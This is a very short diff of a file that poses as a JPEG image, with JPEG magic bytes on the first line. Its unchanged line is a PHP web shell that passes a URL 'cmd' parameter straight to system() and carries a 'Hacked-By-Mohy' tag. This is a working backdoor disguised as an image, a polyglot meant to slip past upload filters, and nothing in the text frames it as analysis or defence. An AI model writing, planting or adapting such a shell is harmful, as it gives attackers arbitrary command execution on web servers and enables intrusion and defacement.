@@ -1,2 +1,2 @@
-ÿØÿ
+\xFF\xD8\xFF
 <?php echo "Hacked-By-Mohy: " . system($_GET['cmd']); ?>
